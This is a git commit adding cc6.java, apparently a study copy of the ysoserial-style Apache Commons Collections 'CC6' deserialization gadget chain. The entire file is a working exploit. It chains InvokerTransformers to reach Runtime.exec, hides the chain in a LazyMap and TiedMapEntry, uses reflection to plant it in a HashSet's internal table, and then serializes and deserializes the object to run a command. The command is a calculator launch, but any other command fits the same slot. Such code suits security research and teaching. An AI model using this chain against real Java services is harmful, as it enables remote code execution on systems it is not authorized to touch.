cf45ab9b36225ab7d475ce0fba74a50350590124
BabyTeam1024 <74447452+BabyTeam1024@users.noreply.github.com>
2021-02-18 00:32:20 +0800

    Create cc6.java

---
+++ cc6.java
@@ -0,0 +1,77 @@
+package com.reflect;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import ysoserial.payloads.util.Reflections;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+public class cc6test {
+    public static byte[] serialize(final Object obj) throws Exception {
+        ByteArrayOutputStream btout = new ByteArrayOutputStream();
+        ObjectOutputStream objOut = new ObjectOutputStream(btout);
+        objOut.writeObject(obj);
+        return btout.toByteArray();
+    }
+
+    public static Object unserialize(final byte[] serialized) throws Exception {
+        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
+        ObjectInputStream objIn = new ObjectInputStream(btin);
+        return objIn.readObject();
+    }
+
+    public static void main(String[] args) throws Exception {
+        final String[] execArgs = new String[] { "/System/Applications/Calculator.app/Contents/MacOS/Calculator" };
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        "getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer("exec",
+                        new Class[] { String.class }, execArgs),
+                new ConstantTransformer(1) };
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+        HashSet map = new HashSet(1);
+        map.add("foo");
+        Field f = null;
+        f = HashSet.class.getDeclaredField("map");
+        f.setAccessible(true);
+        HashMap innimpl = (HashMap) f.get(map);
+
+        Field f2 = null;
+        f2 = HashMap.class.getDeclaredField("table");
+        f2.setAccessible(true);
+        Object[] array = (Object[]) f2.get(innimpl);
+
+        Object node = array[0];
+        if(node == null){
+            node = array[1];
+        }
+
+        Field keyField = null;
+        keyField = node.getClass().getDeclaredField("key");
+        keyField.setAccessible(true);
+        keyField.set(node, entry);
+
+        byte[] serializeData=serialize(map);
+        unserialize(serializeData);
+    }
+}
